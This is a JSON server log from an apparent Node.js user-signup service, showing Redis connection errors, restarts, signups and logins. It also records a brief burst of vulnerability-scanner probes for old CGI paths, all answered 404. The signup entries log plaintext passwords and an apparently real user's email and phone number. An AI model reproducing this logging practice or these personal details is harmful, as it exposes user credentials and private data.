{"code":"ECONNREFUSED","level":"error","message":"Redis Client Error","stack":"AggregateError [ECONNREFUSED]: \n    at internalConnectMultiple (node:net:1118:18)\n    at afterConnectMultiple (node:net:1685:7)","timestamp":"2025-11-29 17:04:00"}
{"code":"ECONNREFUSED","level":"error","message":"Redis Client Error","stack":"AggregateError [ECONNREFUSED]: \n    at internalConnectMultiple (node:net:1118:18)\n    at afterConnectMultiple (node:net:1685:7)","timestamp":"2025-11-29 17:04:02"}
{"code":"ECONNREFUSED","level":"error","message":"Redis Client Error","stack":"AggregateError [ECONNREFUSED]: \n    at internalConnectMultiple (node:net:1118:18)\n    at afterConnectMultiple (node:net:1685:7)","timestamp":"2025-11-29 17:04:04"}
{"code":"ECONNREFUSED","level":"error","message":"Redis Client Error","stack":"AggregateError [ECONNREFUSED]: \n    at internalConnectMultiple (node:net:1118:18)\n    at afterConnectMultiple (node:net:1685:7)","timestamp":"2025-11-29 17:04:07"}
{"code":"ECONNREFUSED","level":"error","message":"Redis Client Error","stack":"AggregateError [ECONNREFUSED]: \n    at internalConnectMultiple (node:net:1118:18)\n    at afterConnectMultiple (node:net:1685:7)","timestamp":"2025-11-29 17:04:09"}
{"code":"ECONNREFUSED","level":"error","message":"Redis Client Error","stack":"AggregateError [ECONNREFUSED]: \n    at internalConnectMultiple (node:net:1118:18)\n    at afterConnectMultiple (node:net:1685:7)","timestamp":"2025-11-29 17:04:11"}
{"code":"ECONNREFUSED","level":"error","message":"Redis Client Error","stack":"AggregateError [ECONNREFUSED]: \n    at internalConnectMultiple (node:net:1118:18)\n    at afterConnectMultiple (node:net:1685:7)","timestamp":"2025-11-29 17:04:13"}
{"code":"ECONNREFUSED","level":"error","message":"Redis Client Error","stack":"AggregateError [ECONNREFUSED]: \n    at internalConnectMultiple (node:net:1118:18)\n    at afterConnectMultiple (node:net:1685:7)","timestamp":"2025-11-29 17:04:15"}
{"code":"ECONNREFUSED","level":"error","message":"Redis Client Error","stack":"AggregateError [ECONNREFUSED]: \n    at internalConnectMultiple (node:net:1118:18)\n    at afterConnectMultiple (node:net:1685:7)","timestamp":"2025-11-29 17:04:17"}
{"code":"ECONNREFUSED","level":"error","message":"Redis Client Error","stack":"AggregateError [ECONNREFUSED]: \n    at internalConnectMultiple (node:net:1118:18)\n    at afterConnectMultiple (node:net:1685:7)","timestamp":"2025-11-29 17:04:19"}
{"code":"ECONNREFUSED","level":"error","message":"Redis Client Error","stack":"AggregateError [ECONNREFUSED]: \n    at internalConnectMultiple (node:net:1118:18)\n    at afterConnectMultiple (node:net:1685:7)","timestamp":"2025-11-29 17:04:21"}
{"code":"ECONNREFUSED","level":"error","message":"Redis Client Error","stack":"AggregateError [ECONNREFUSED]: \n    at internalConnectMultiple (node:net:1118:18)\n    at afterConnectMultiple (node:net:1685:7)","timestamp":"2025-11-29 17:04:23"}
{"code":"ECONNREFUSED","level":"error","message":"Redis Client Error","stack":"AggregateError [ECONNREFUSED]: \n    at internalConnectMultiple (node:net:1118:18)\n    at afterConnectMultiple (node:net:1685:7)","timestamp":"2025-11-29 17:04:25"}
{"code":"ECONNREFUSED","level":"error","message":"Redis Client Error","stack":"AggregateError [ECONNREFUSED]: \n    at internalConnectMultiple (node:net:1118:18)\n    at afterConnectMultiple (node:net:1685:7)","timestamp":"2025-11-29 17:04:27"}
{"code":"ECONNREFUSED","level":"error","message":"Redis Client Error","stack":"AggregateError [ECONNREFUSED]: \n    at internalConnectMultiple (node:net:1118:18)\n    at afterConnectMultiple (node:net:1685:7)","timestamp":"2025-11-29 17:04:30"}
{"code":"ECONNREFUSED","level":"error","message":"Redis Client Error","stack":"AggregateError [ECONNREFUSED]: \n    at internalConnectMultiple (node:net:1118:18)\n    at afterConnectMultiple (node:net:1685:7)","timestamp":"2025-11-29 17:04:32"}
{"code":"ECONNREFUSED","level":"error","message":"Redis Client Error","stack":"AggregateError [ECONNREFUSED]: \n    at internalConnectMultiple (node:net:1118:18)\n    at afterConnectMultiple (node:net:1685:7)","timestamp":"2025-11-29 17:04:34"}
{"code":"ECONNREFUSED","level":"error","message":"Redis Client Error","stack":"AggregateError [ECONNREFUSED]: \n    at internalConnectMultiple (node:net:1118:18)\n    at afterConnectMultiple (node:net:1685:7)","timestamp":"2025-11-29 17:04:36"}
{"code":"ECONNREFUSED","level":"error","message":"Redis Client Error","stack":"AggregateError [ECONNREFUSED]: \n    at internalConnectMultiple (node:net:1118:18)\n    at afterConnectMultiple (node:net:1685:7)","timestamp":"2025-11-29 17:04:38"}
{"code":"ECONNREFUSED","level":"error","message":"Redis Client Error","stack":"AggregateError [ECONNREFUSED]: \n    at internalConnectMultiple (node:net:1118:18)\n    at afterConnectMultiple (node:net:1685:7)","timestamp":"2025-11-29 17:04:40"}
{"code":"ECONNREFUSED","level":"error","message":"Redis Client Error","stack":"AggregateError [ECONNREFUSED]: \n    at internalConnectMultiple (node:net:1118:18)\n    at afterConnectMultiple (node:net:1685:7)","timestamp":"2025-11-29 17:04:42"}
{"code":"ECONNREFUSED","level":"error","message":"Redis Client Error","stack":"AggregateError [ECONNREFUSED]: \n    at internalConnectMultiple (node:net:1118:18)\n    at afterConnectMultiple (node:net:1685:7)","timestamp":"2025-11-29 17:04:44"}
{"code":"ECONNREFUSED","level":"error","message":"Redis Client Error","stack":"AggregateError [ECONNREFUSED]: \n    at internalConnectMultiple (node:net:1118:18)\n    at afterConnectMultiple (node:net:1685:7)","timestamp":"2025-11-29 17:04:46"}
{"level":"info","message":"Server started on port 8001","timestamp":"2025-11-29 17:04:51"}
{"level":"info","message":"gRPC Server running on port 50052","timestamp":"2025-11-29 17:04:51"}
{"level":"info","message":"Connected to MongoDB","timestamp":"2025-11-29 17:04:51"}
{"body":{"city":"Test City","email":"test1764416107528@example.com","name":"Test User","password":"password123","phone":"1234567890","role":"retailer"},"level":"info","message":"Signup attempt","timestamp":"2025-11-29 17:05:07"}
{"level":"info","message":"Signup successful","role":"retailer","timestamp":"2025-11-29 17:05:07","userId":"692ada6bc3b3e2320cae1df6"}
{"level":"info","message":"::1 - - [29/Nov/2025:11:35:07 +0000] \"POST /offerzone/users/ HTTP/1.1\" 201 442 \"-\" \"axios/1.13.2\"","timestamp":"2025-11-29 17:05:07"}
{"body":{"city":"Bengaluru","email":"belalnaim@gmail.com","name":"belal","password":"pass","phone":"6386164836","role":"retailer"},"level":"info","message":"Signup attempt","timestamp":"2025-11-29 17:05:56"}
{"level":"info","message":"Signup successful","role":"retailer","timestamp":"2025-11-29 17:05:56","userId":"692ada9cc3b3e2320cae1dfb"}
{"level":"info","message":"::1 - - [29/Nov/2025:11:35:56 +0000] \"POST /offerzone/users/ HTTP/1.1\" 201 415 \"http://localhost:8085/api-docs/\" \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36\"","timestamp":"2025-11-29 17:05:56"}
{"email":"belalnaim@gmail.com","level":"info","message":"Login attempt","timestamp":"2025-11-29 17:06:18"}
{"level":"info","message":"Login successful","role":"retailer","timestamp":"2025-11-29 17:06:18","userId":"692ada9cc3b3e2320cae1dfb"}
{"level":"info","message":"::1 - - [29/Nov/2025:11:36:18 +0000] \"POST /offerzone/users/session HTTP/1.1\" 200 414 \"http://localhost:8085/api-docs/\" \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36\"","timestamp":"2025-11-29 17:06:18"}
{"email":"belalnaim@gmail.com","level":"info","message":"Login attempt","timestamp":"2025-11-29 17:06:35"}
{"level":"info","message":"Login successful","role":"retailer","timestamp":"2025-11-29 17:06:35","userId":"692ada9cc3b3e2320cae1dfb"}
{"level":"info","message":"::1 - - [29/Nov/2025:11:36:35 +0000] \"POST /offerzone/users/session HTTP/1.1\" 200 414 \"http://localhost:8085/api-docs/\" \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36\"","timestamp":"2025-11-29 17:06:35"}
{"level":"info","message":"Fetching user by ID","timestamp":"2025-11-29 17:06:50","userId":"692ada9cc3b3e2320cae1dfb"}
{"level":"info","message":"::1 - - [29/Nov/2025:11:36:50 +0000] \"GET /offerzone/users/692ada9cc3b3e2320cae1dfb HTTP/1.1\" 200 226 \"http://localhost:8085/api-docs/\" \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36\"","timestamp":"2025-11-29 17:06:50"}
{"level":"info","message":"::ffff:10.33.29.38 - - [29/Nov/2025:11:40:15 +0000] \"GET /securecgi-bin/CSUserCGI.exe?ver HTTP/1.1\" 404 166 \"-\" \"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)\"","timestamp":"2025-11-29 17:10:15"}
{"level":"info","message":"::ffff:10.33.29.38 - - [29/Nov/2025:11:40:16 +0000] \"GET /securecgi-bin/CSUserCGI.exe?Init+0 HTTP/1.1\" 404 166 \"-\" \"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)\"","timestamp":"2025-11-29 17:10:16"}
{"level":"info","message":"::ffff:10.33.29.38 - - [29/Nov/2025:11:40:44 +0000] \"GET /self_upgrade.html HTTP/1.1\" 404 156 \"-\" \"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)\"","timestamp":"2025-11-29 17:10:44"}
{"level":"info","message":"::ffff:10.33.29.38 - - [29/Nov/2025:11:41:03 +0000] \"GET /login.html HTTP/1.1\" 404 149 \"-\" \"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)\"","timestamp":"2025-11-29 17:11:03"}
{"level":"info","message":"::ffff:10.33.29.38 - - [29/Nov/2025:11:41:03 +0000] \"GET /login?redirects=10 HTTP/1.1\" 404 144 \"-\" \"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)\"","timestamp":"2025-11-29 17:11:03"}
{"level":"info","message":"::ffff:10.33.29.38 - - [29/Nov/2025:11:41:10 +0000] \"GET /cgi-bin/kvm.cgi?&file=login HTTP/1.1\" 404 154 \"-\" \"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)\"","timestamp":"2025-11-29 17:11:10"}
{"level":"info","message":"::ffff:10.33.29.38 - - [29/Nov/2025:11:41:34 +0000] \"GET /snmx-cgi/fxm.exe HTTP/1.1\" 404 155 \"-\" \"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)\"","timestamp":"2025-11-29 17:11:34"}
{"level":"info","message":"Server started on port 8001","timestamp":"2025-11-29 17:26:52"}
{"level":"info","message":"gRPC Server running on port 50052","timestamp":"2025-11-29 17:26:52"}
{"level":"info","message":"Connected to MongoDB","timestamp":"2025-11-29 17:26:52"}
{"level":"info","message":"Server started on port 8001","timestamp":"2025-11-29 17:37:17"}
{"level":"info","message":"gRPC Server running on port 50052","timestamp":"2025-11-29 17:37:17"}
{"level":"info","message":"Connected to MongoDB","timestamp":"2025-11-29 17:37:17"}
{"level":"info","message":"Server started on port 8001","timestamp":"2025-11-29 17:42:02"}
{"level":"info","message":"gRPC Server running on port 50052","timestamp":"2025-11-29 17:42:02"}
{"level":"info","message":"Connected to MongoDB","timestamp":"2025-11-29 17:42:03"}
{"level":"info","message":"Server started on port 8001","timestamp":"2025-11-29 17:54:57"}
{"level":"info","message":"gRPC Server running on port 50052","timestamp":"2025-11-29 17:54:57"}
{"level":"info","message":"Connected to MongoDB","timestamp":"2025-11-29 17:54:58"}
{"level":"info","message":"Server started on port 8001","timestamp":"2025-11-29 18:23:58"}
{"level":"info","message":"gRPC Server running on port 50052","timestamp":"2025-11-29 18:23:58"}
{"level":"info","message":"Connected to Redis","timestamp":"2025-11-29 18:23:58"}
{"level":"info","message":"Connected to MongoDB","timestamp":"2025-11-29 18:23:58"}
{"level":"info","message":"Server started on port 8001","timestamp":"2025-11-29 18:30:57"}
{"level":"info","message":"gRPC Server running on port 50052","timestamp":"2025-11-29 18:30:57"}
{"level":"info","message":"Connected to Redis","timestamp":"2025-11-29 18:30:57"}
{"level":"info","message":"Connected to MongoDB","timestamp":"2025-11-29 18:30:58"}
{"body":{"city":"Test City","email":"test1764421267317@example.com","name":"Test User","password":"password123","phone":"1234567890","role":"retailer"},"level":"info","message":"Signup attempt","timestamp":"2025-11-29 18:31:07"}
{"level":"info","message":"Signup successful","role":"retailer","timestamp":"2025-11-29 18:31:07","userId":"692aee935ff53886ee0f7fb4"}
{"level":"info","message":"::1 - - [29/Nov/2025:13:01:07 +0000] \"POST /offerzone/users/ HTTP/1.1\" 201 442 \"-\" \"axios/1.13.2\"","timestamp":"2025-11-29 18:31:07"}
